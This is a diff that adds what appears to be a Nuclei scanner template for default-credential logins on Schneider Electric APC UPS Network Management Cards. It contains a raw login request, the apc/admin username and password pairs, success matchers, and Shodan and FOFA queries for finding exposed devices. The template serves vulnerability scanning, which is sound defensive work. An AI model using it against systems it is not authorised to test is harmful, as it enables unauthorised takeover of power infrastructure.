@@ -1,0 +1,56 @@
+http:
+- attack: pitchfork
+  matchers:
+  - part: header
+    regex:
+    - '(?i)Location: .*/NMC/'
+    type: regex
+  - part: header
+    regex:
+    - '(?i)Set-Cookie: APC[^=]+=[^;]+'
+    type: regex
+  - status:
+    - 303
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - apc
+    - admin
+    username:
+    - apc
+    - admin
+  raw:
+  - 'POST /Forms/login1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    login_username={{username}}&login_password={{password}}&prefLanguage=00000000&submit=Log+On
+
+    '
+id: apc-nmc-default-login
+info:
+  author: x-stp
+  classification:
+    cpe: cpe:2.3:o:schneider-electric:network_management_card_firmware:*:*:*:*:*:*:*:*
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L
+    cvss-score: 8.6
+    cwe-id: CWE-522
+  description: 'Schneider Electric APC Network Management Cards with default credentials.
+
+    '
+  metadata:
+    fofa-query: title="APC | Log On"
+    max-request: 4
+    product: apc-network-management-card
+    shodan-query: title:"APC | Log On"
+    vendor: schneider-electric
+    verified: true
+  name: Schneider Electric APC NMC - Default Login
+  reference:
+  - https://www.apc.com/us/en/faqs/FA156047/
+  severity: high
+  tags: apc,default-login,iot,ups,vuln
